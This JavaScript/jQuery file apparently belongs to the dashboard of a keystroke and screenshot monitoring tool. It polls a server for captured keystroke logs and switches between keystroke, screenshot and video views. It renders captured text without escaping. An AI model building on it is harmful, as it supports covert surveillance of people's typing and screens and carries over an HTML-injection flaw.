function filterLogs(category) {
  var logs = document.querySelectorAll(".log-entry");

  logs.forEach(function (log) {
    if (category === "all") {
      log.style.display = "block"; // Show all logs if 'All' is selected
    } else {
      // Check if log entry has the specified category class
      var hasCategory = log.classList.contains(category);

      // Toggle display based on category match
      log.style.display = hasCategory ? "block" : "none";
    }
  });
}

$(document).ready(function () {
  fetchLogs();

  $("#btnScreenshots").on("click", function () {
    // Show the iframe and load the screenshot page
    $("#log-container").hide();
    $("#iframe-container").show();
    $("#screenshot-iframe").attr("src", "/screenshots");
  });

  $("#btnKeystrokes, #btnVideos").on("click", function () {
    // Show the logs and hide the iframe
    $("#log-container").show();
    $("#iframe-container").hide();
  });
});

$(document).ready(function () {
  $("#sidebarCollapse").on("click", function () {
    $(".sidebar").toggleClass("active");
  });
});

function fetchLogs() {
  $.ajax({
    url: "/get_logs",
    method: "GET",
    success: function (data) {
      // Clear the current logs
      $("#log-container").empty();

      // Append new logs
      data.forEach(function (log) {
        $("#log-container").append(
          `<div class="log-entry">
                                <div class="timestamp">${log.timestamp}</div>
                                <div class="log-content">${log.content}</div>
                            </div>`
        );
      });
    },
    error: function (error) {
      console.log("Error fetching logs:", error);
    },
  });
}

// Fetch logs every 5 seconds
setInterval(fetchLogs, 5000);

// Initial fetch
fetchLogs();

$(document).ready(function () {
  // Handle click on Keystrokes button
  $("#btnKeystrokes").click(function () {
    $("#keystrokesContent").show(); // Show Keystrokes content
    $("#screenshotsContent").hide(); // Hide Screenshots content
  });

  // Handle click on Screenshots button
  $("#btnScreenshots").click(function () {
    // Load content from screenshots.html using AJAX
    $.ajax({
      url: "screenshots.html",
      type: "GET",
      success: function (data) {
        $("#screenshotsContent").html(data); // Load HTML content into screenshotsContent div
        $("#screenshotsContent").show(); // Show Screenshots content
        $("#keystrokesContent").hide(); // Hide Keystrokes content
      },
      error: function (xhr, status, error) {
        console.error("Error loading screenshots:", error);
        // Handle error loading screenshots.html
      },
    });
  });

  // Handle click on Videos button (if needed)
  $("#btnVideos").click(function () {
    // Handle click on Videos button if required
  });
});

$(document).ready(function () {
  // Initially show keystrokes
  $("#log-container").show();
  $("#iframe-container").hide();

  // Toggle buttons logic
  $(".toggle-btn").click(function () {
    var target = $(this).data("target");

    // Toggle active class
    $(".toggle-btn").removeClass("active");
    $(this).addClass("active");

    // Show respective container
    if (target === "keystrokes") {
      $("#log-container").show();
      $("#iframe-container").hide();
    } else if (target === "screenshots") {
      $("#log-container").hide();
      $("#iframe-container").show();
      // Load iframe content on first click
      var iframe = document.getElementById("screenshot-iframe");
      iframe.src = "/screenshots"; // Set iframe source
    }
  });

  // Modal for screenshots overlay view
  $(".screenshot-thumbnail").click(function () {
    var imageSrc = $(this).data("image");
    $("#overlayImage").attr("src", imageSrc);
    // Additional logic for modal navigation if needed
  });
});
